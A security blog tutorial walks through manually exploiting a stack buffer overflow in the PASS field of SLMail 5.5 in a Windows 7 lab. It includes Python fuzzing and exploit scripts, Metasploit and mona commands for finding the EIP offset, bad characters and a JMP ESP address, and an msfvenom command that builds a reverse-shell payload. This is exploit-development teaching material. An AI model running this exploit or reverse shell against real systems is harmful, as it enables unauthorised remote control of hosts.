---
id: "buffer-overflow-en-slmail"
title: "32-Bit Buffer Overflow in SLMail 5.5"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2021-11-28
updatedDate: 2021-11-28
image: "https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-0.webp"
description: "Manual exploitation of Buffer Overflow in SLMail 5.5, from fuzzing to obtaining a reverse shell, controlling the EIP and avoiding badchars."
categories:
  - "low-level"
draft: false
featured: false
lang: "en"
---

In this post, we are going to exploit the SLMail service version 5.5 which is vulnerable to a Buffer Overflow in the PASS field:

![Vulnerability in SLMail 5.5](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-1.avif)

Although there are already scripts that automate the exploitation, we are going to do it manually.

First of all, it is recommended to have read the post on [Fundamentals for Stack Based Buffer Overflow](https://blog.deephacking.tech/en/posts/fundamentals-for-stack-based-buffer-overflow/) if you have never executed this type of attack.

We will be working with our Kali and a 32-bit Windows 7.

- [Introduction](#introduction)
- [Fuzzing](#fuzzing)
- [Taking control of the EIP](#taking-control-of-the-eip)
- [Finding badchars](#finding-badchars)
- [Create payload with msfvenom](#create-payload-with-msfvenom)
- [Finding address with JMP ESP opcode](#finding-address-with-jmp-esp-opcode)
- [Final exploit](#final-exploit)

## Introduction

The first thing is to download and install the "SLMail" service on Windows 7. Before this, we have to make sure that our Windows 7 has DEP disabled and that the firewall does not block us, at least ports 25 and 110.

- We can configure the firewall using "Windows Firewall with Advanced Security" or netsh. For the latter, we can see how to do it in the [netsh pivoting](https://blog.deephacking.tech/en/posts/how-to-do-pivoting-with-netsh/) post.
- And we can disable DEP (Data Execution Prevention) from a terminal as administrator using the command:
- `bcdedit.exe /set nx AlwaysOff`

We can download SLMail 5.5 from its [official website](https://slmail.software.informer.com/download/?lang=es). Once we download it, we start the installation process:

![SLMail Installation](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-2.avif)

In this case, you don't need to change anything, just click "Next" all the way through is enough. When the installation is complete, we will restart the computer and that's it. We will have SLMail installed.

When the computer starts up, we open SLMail as administrator:

![Open SLMail as administrator](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-3.avif)

And we go to the control tab:

![SLMail control tab](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-4.avif)

From this section is where we can control whether the service is paused or started. It will be useful for us when it crashes due to the buffer overflow. As we can see, it is now started, so if we go to our Kali, we can see ports 25 and 110 open:

![Ports 25 and 110 open](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-5.avif)

With all the service installed, running and exposed, we can now get started with the buffer overflow.

In this particular case, we have already identified and know in advance that the service is vulnerable. In addition, we have seen in searchsploit that there are already scripts that exploit it automatically. So we are going to use one of these scripts to help us identify the way.

In any other case, when we don't know what service it is and we know almost nothing, the best option is simply to connect to the port via netcat or telnet and see if it responds in some way, and from there, see what can be done.

That said, let's take a look at the first script from searchsploit:

![Searchsploit script](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-6.avif)

The title already tells us that the vulnerable parameter seems to be `PASS`

Taking a look at the first script, we see how the procedure would be:

![Exploit procedure](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-7.avif)

The `PASS` parameter seems to be the password field of a login. Also, if we notice, we see that of the two ports that SLMail uses, 25 and 110, it connects to 110, so we also identify which of the two ports to connect to.

Let's try it manually:

![Manual test of PASS parameter](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-8.avif)

It seems that both fields are valid, although they tell us that the credentials are incorrect.

At this point we already have what we need to start:

- Vulnerable service detected
- Port to connect to
- Vulnerable parameter

## Fuzzing

Knowing all this, it is time to do Fuzzing, that is, we have to find out what amount of information is needed in the `PASS` parameter for the Buffer Overflow to occur and the program to crash.

Before fuzzing, on Windows 7 we are going to open Immunity Debugger as administrator to attach to the SLMail process:

![Immunity Debugger as administrator](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-9.avif)

![Attach to process](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-10.avif)

This way we will have attached Immunity Debugger to the SLMail process:

![Immunity Debugger attached](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-11.avif)

Note that when we attach with Immunity to a process, it pauses. We can see it at the bottom right:

![Paused process](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-12.avif)

So let's never forget to resume the process:

![Resume process](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-13.avif)

![Process resumed](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-14.avif)

With this done, now to do fuzzing we are going to make use of a python script, which automates the task:

```python
#!/usr/bin/python

from pwn import *
import socket, sys

if len(sys.argv) < 2:
    print "\n[!] Usage: python " + sys.argv[0] + " <ip-address>\n"
    sys.exit(0)

# Global variables
ip_address = sys.argv[1]
rport = 9999

if __name__ == '__main__':

    buffer = ["A"]
    counter = 100

    while len(buffer) < 32:
        buffer.append("A"*counter)
        counter += 100

    p1 = log.progress("Data")

    for strings in buffer:

        try:
            p1.status("Sending %s bytes" % len(strings))

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip_address, rport))
            data = s.recv(1024)

            s.send("%s" % strings)
            data = s.recv(1024)

        except:

            print "\n[!] There was a connection error\n"
            sys.exit(1)
```

This is the standard script, we just have to adapt it to suit the case we need:

```python
#!/usr/bin/python

from pwn import *
import socket, sys

if len(sys.argv) < 2:
    print "\n[!] Usage: python " + sys.argv[0] + " <ip-address>\n"
    sys.exit(0)

# Global variables
ip_address = sys.argv[1]
rport = <port>

if __name__ == '__main__':

    buffer = ["A"]
    counter = 150

    while len(buffer) < 32:
        buffer.append("A"*counter)
        counter += 150

    p1 = log.progress("Data")

    for strings in buffer:

        try:
            p1.status("Sending %s bytes" % len(strings))

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip_address, rport))
            data = s.recv(1024)

            s.send("USER test\n\r")
            data = s.recv(1024)

            s.send("PASS %s\n\r" % strings)
            data = s.recv(1024)

        except:

            print "\n[!] There was a connection error\n"
            sys.exit(1)
```

> When we send the USER and the PASS, placing `\n\r` at the end, we are simulating that we press the enter key

The use of the script is simple, we just have to specify an IP, in addition to editing the port in the code:

![Edit port in script](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-15.avif)

![Port changed](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-16.avif)

With the port changed, we are going to execute the script pointing to Windows 7:

![Execute fuzzing script](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-17.avif)

![Script executing](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-18.avif)

![Script stopped](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-19.avif)

When the number of bytes gets stuck, we go back to immunity debugger (or we can also see how immunity behaves while receiving the bytes):

![Immunity Debugger with crashed program](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-20.avif)

![Paused process state](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-21.avif)

![Overwritten registers](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-22.avif)

As we can see, the program status is "Paused", so the program has crashed. In addition, we can see how the registers have been left.

If we look at the EBP and EIP fields, we see how the value of the 4 bytes is `\x41` (this is the format to represent hexadecimal, with `\x` as prefix).

<figure>

![Reference about \x in hexadecimal](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-23.avif)

<figcaption>

[StackOverflow reference about \x in C/C++](https://stackoverflow.com/questions/2547349/what-does-x-mean-in-c-c#:~:text=%5Cx%20indicates%20a%20hexadecimal%20character,a%20null%20%27%5Cx00%27%20)

</figcaption>

</figure>

For those who don't know, `41` is the letter A in hexadecimal, which is exactly what we are sending.

![Value 41 in hexadecimal](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-24.avif)

![Letter A in hexadecimal](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-25.avif)

What does this mean?

Basically, let's imagine that the service at most expected in the "PASS" field, a maximum value of 30 characters (which is not the case, it is quite more).

What would happen if we send 60 characters?

It happens then that the memory that the program has reserved for that field is much less than the received data, so that difference of 30 (60 - 30) has to go somewhere. And this is where overwriting registers begins.

The idea is basically this:

![Buffer Overflow scheme](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-26.avif)

Having this clear, and seeing how we have overwritten the EIP and the EBP, the idea now is to take control of the EIP, that is, to determine exactly how many '`A`' we have to send before starting to overwrite it.

This register is so important to us, since it is the address of the next instruction of the program, that's why it's called EIP (Extended Instruction Pointer).

For this same reason the program crashes, since by overwriting this register, when the program is going to continue its flow, what it does is see what address the EIP points to, and of course, if the address it points to is 0x41414141, well it doesn't get anywhere, since it is not a valid memory address. That's why the program crashes.

## Taking control of the EIP

With all this clear, to determine the offset of the EIP, or in other words, how many '`A`' are needed to overwrite it, we are going to make use of two metasploit tools (in an exam like the OSCP it is totally valid to use these two tools):

- `pattern_create.rb`
- `pattern_offset.rb`

Making sure we have metasploit installed, we can find these two tools as follows:

![Locate Metasploit tools](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-27.avif)

First we are going to use `pattern_create.rb`. What this tool allows us to do is create a string of the length we indicate. This string is specially designed so that there are no repeated patterns.

Before, we verified that with 2700 bytes we already managed to not only crash the program, but also overwrite the registers. So now we are going to change the script a bit to directly send only one payload. The model of the script to use would be the following:

```python
#!/usr/bin/python

from pwn import *
import socket, sys
from struct import pack

if len(sys.argv) < 2:
    print "\n[!] Usage: python " + sys.argv[0] + " <ip-address>\n"
    sys.exit(0)

# Global variables
ip_address = sys.argv[1]
rport = 9999

shellcode_windows=()

shellcode_linux=()

if __name__ == '__main__':

    p1 = log.progress("Data")

    payload = <payload>

    try:
        p1.status("Sending payload")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        data = s.recv(1024)

        s.send(payload + '\r\n')
        data = s.recv(1024)

    except:

        print "\n[!] There was a connection error\n"
        sys.exit(1)
```

Again, we simply copy it and adapt it to what we need:

```python
#!/usr/bin/python

from pwn import *
import socket, sys
from struct import pack

if len(sys.argv) < 2:
    print "\n[!] Usage: python " + sys.argv[0] + " <ip-address>\n"
    sys.exit(0)

# Global variables
ip_address = sys.argv[1]
rport = 110

shellcode_windows=()

shellcode_linux=()

if __name__ == '__main__':

    p1 = log.progress("Data")

    payload = <payload>

    try:
        p1.status("Sending payload")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        data = s.recv(1024)

        s.send('USER test\r\n')
        data = s.recv(1024)

        s.send('PASS ' + payload + '\r\n')
        data = s.recv(1024)

    except:

        print "\n[!] There was a connection error\n"
        sys.exit(1)
```

With this, we are now going to generate a 2700 byte string with `pattern_create.rb`:

`pattern_create.rb -l <string length>`

![Generate string with pattern_create](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-28.avif)

We copy this output and attach it to the payload variable of the script:

![Add payload to script](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-29.avif)

This way, we are going to execute the script so that it directly sends this payload to the `PASS` field.

> Every time we cause a buffer overflow and the program crashes, we have to restart the service and attach ourselves with immunity debugger to it again, since when restarting the service the process changes.

We execute the exploit:

![Execute exploit with pattern](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-30.avif)

In immunity we can see how the program crashes:

![Crashed program in Immunity](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-31.avif)

With this done, the idea now is to look at the value of the EIP register:

![Value of EIP register](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-32.avif)

It is 39694438. This value corresponds to a specific part of the string we sent in the payload.

Taking this number into account, we are going to use `pattern_offset.rb`:

`pattern_offset.rb -q <EIP value>`

![Result of pattern_offset](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-33.avif)

Note, it tells us that the offset is 2606, that is, if we send 2606 `A` and 4 `B`, the value of the EIP should be 42424242 (since 42 is B in hexadecimal).

Let's check it:

![Script with correct offset](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-34.avif)

We restart the service

We attach with Immunity Debugger

We execute the exploit:

![Execute exploit with offset](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-35.avif)

![EIP controlled with value 42424242](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-36.avif)

As we can see, EIP is worth the 4 `B` that we sent. It is at this point when it is said that we have control of the EIP.

## Finding badchars

Now, it is time to find out the "badchars". Badchars are bytes that, so to speak, the program does not accept. In such a way that if we generated a payload with any badchar, it would not work.

For this step, we are going to make use of mona, an Immunity Debugger module that will make the task easier.

Its installation is quite simple, we download the [mona.py](https://github.com/corelan/mona) script from its official repository. We move this script to the following path:

`C:\Archivos de programa\Immunity Inc\Immunity Debugger\PyCommands`

`C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands`

And this way it will have been installed. We can check it in Immunity Debugger with `!mona`:

![Check Mona installation](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-37.avif)

Done this, we are going to configure the workspace with the command:

`!mona config -set workingfolder <path>\%p`

![Configure Mona workspace](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-38.avif)

Now, we are going to generate a byte array as follows:

`!mona bytearray`

![Generate bytearray with Mona](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-39.avif)

This generates a string with all possible bytes. It will help us determine which are badchars and which are not.

In addition, with this command, since we have previously configured the workspace, now a folder will have been generated with the name of the process to which we are attached:

![Generated process folder](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-40.avif)

Inside, we can find a txt with the byte string:

![Text file with bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-41.avif)

![Bytearray content](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-42.avif)

We copy the string and add it to the payload.

![Add bytearray to payload](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-43.avif)

With this, we do the usual, restart the service, attach with Immunity and execute the exploit:

![Execute exploit with bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-44.avif)

![Crashed program with bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-45.avif)

Now we are interested in the value of the ESP. Using this value, mona will automate the task of detecting badchars.

We will use the following command:

`!mona compare -f <specify the path of bytearray.bin> -a <ESP address>`

`!mona compare -f C:\Users\JuanA\Desktop\SLMail\bytearray.bin -a 0258A128`

![Result of mona compare](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-46.avif)

In this way, as we can see, mona tells us that a badchar is `\x00` (this is a very typical badchar, so it is normally removed immediately)

With this done, we are going to update the bytearray files we have, to tell them to remove `\x00`:

`!mona bytearray -cpb '"<badchars>"'`

`!mona bytearray -cpb '"\x00"'`

![Update bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-47.avif)

In this way, the bytearray file will have been updated.

![Updated bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-48.avif)

Since we already know that `\x00` is a badchar, we will simply remove it from the payload in the exploit:

![Remove \x00 from payload](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-49.avif)

We execute the exploit...

![Execute exploit without \x00](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-50.avif)

And now we do the same process to detect the badchar:

`!mona compare -f <specify the path of bytearray.bin> -a <ESP address>`

`!mona compare -f C:\Users\JuanA\Desktop\SLMail\bytearray.bin -a 01ADA128`

![Detect second badchar](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-51.avif)

It detects that `\x0a` is another. Well, we do the same as before:

`!mona bytearray -cpb '"<badchars>"'`

`!mona bytearray -cpb '"\x00\x0a"'`

![Update bytearray without \x0a](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-52.avif)

We check that it has been removed:

![Check updated bytearray](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-53.avif)

And with this, the same as before, now we remove `\x0a` from the payload.

![Remove \x0a from payload](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-54.avif)

And we repeat the whole process again. This part is a bit repetitive.

![Execute exploit without \x0a](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-55.avif)

![Program crash](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-56.avif)

`!mona compare -f <specify the path of bytearray.bin> -a <ESP address>`

`!mona compare -f C:\Users\JuanA\Desktop\SLMail\bytearray.bin -a 026EA128`

![Detect third badchar](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-57.avif)

We detect another badchar, this time `\x0d`. Well, we do the same:

`!mona bytearray -cpb '"<badchars>"'`

`!mona bytearray -cpb '"\x00\x0a\x0d"'`

![Update bytearray with three badchars](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-58.avif)

And well the same, we now remove `\x0d` from the exploit and repeat everything, until it tells us that it doesn't find any:

![No additional badchars](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-59.avif)

So we have already discovered all the badchars, in this case they are:

- `\x00`
- `\x0a`
- `\x0d`

## Create payload with msfvenom

Knowing this, we are going to create the reverse shell payload with msfvenom (we can use any other payload, for example, the one to execute a specific command in Windows):

`msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -a x86 --platform windows -b <badchars> -e x86/shikata_ga_nai -f c`

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.208.10 LPORT=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c`

![Generate payload with msfvenom](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-60.avif)

> We use EXITFUNC=thread because otherwise when we manage to exploit the buffer overflow and have a shell, if we were to lose it for whatever reason and wanted to get another one we couldn't, because the process will have already been killed. This way we can send ourselves as many shells as we want, since the shell processes are executed as threads and do not replace the main service process

We copy the shellcode generated by msfvenom and add it to the exploit:

![Shellcode generated by msfvenom](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-61.avif)

![Add shellcode to exploit](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-62.avif)

## Finding address with JMP ESP opcode

With this part done, only one last step is missing. We have to get the EIP to point to the ESP, that is, to our payload, since right now it is pointing to the address of 4 `B`.

For this, we have to make the EIP point to a "JMP ESP" address, an address which makes an automatic jump to where the ESP is located.

To do this, we are going to use the metasploit tool `nasm_shell.rb` and `mona`.

`Nasm_shell.rb` does the following:

![Functioning of nasm_shell](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-63.avif)

In this way, we are going to see the opcode associated with JMP ESP:

<figure>

![Opcode reference](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-64.avif)

<figcaption>

opcode

</figcaption>

</figure>

![Get JMP ESP opcode](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-65.avif)

Knowing that the opcode is FFE4, we are going to go to mona and we are going to list the process modules:

`!mona modules`

![List modules with mona](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-66.avif)

Listing the modules, we have to use one that has the first four columns of True and False, in False (since this BoF does not have any protection). In my case I am going to use the following module:

![Select appropriate module](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-67.avif)

With this, now we are going to use mona to search for an address within that module whose opcode is a JMP ESP:

`!mona find -s '"<JMP ESP opcode>"' -m <module>`

`!mona find -s '"\xff\xe4"' -m SLMFC.dll`

![Search for JMP ESP addresses](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-68.avif)

Mona gives us a series of addresses, we can choose any. The only requirement is that this address does not contain any badchar.

In my case, I am going to choose, for example, the last one, `0x5f4c4d13`.

Let's verify that this address is indeed a JMP ESP.

Right click and we copy the address:

![Copy address](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-69.avif)

We go to the following button:

![Button to go to address](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-70.avif)

We paste the address and click OK. This way it will take us to the address we have specified:

![Verify JMP ESP](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-71.avif)

And indeed, we confirm that it is a JMP ESP.

In case that when doing this it takes us to an address that has nothing to do with the one we have put, we simply search again and that's it.

## Final exploit

We already have everything to successfully exploit the buffer overflow. We are going to go to `exploit.py` to make the last touches:

![Exploit before modifying](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-72.avif)

We are going to replace the 4 `B` with the JMP ESP address in Little Endian:

![Replace B with JMP ESP address](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-73.avif)

In this case we use the struct library to automatically make the change to "Little Endian". It would also be valid if we did it manually.

In addition, to make sure that everything goes correctly, we are going to add NOPS between the JMP ESP and the shellcode (we could also cause a stack shift if we did not want to use NOPS):

![Add NOPS to exploit](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-74.avif)

If you don't know what NOPS are, you can see it in the post on [Fundamentals for Stack Based Buffer Overflow](https://blog.deephacking.tech/en/posts/fundamentals-for-stack-based-buffer-overflow/#nops).

In this way, everything is ready. If we listen on the port we specified earlier in msfvenom and execute the exploit:

![Shell obtained](https://cdn.deephacking.tech/i/posts/buffer-overflow-en-slmail/buffer-overflow-en-slmail-75.avif)

We manage to control the flow of the program making it go to our payload and execute a shell for us.
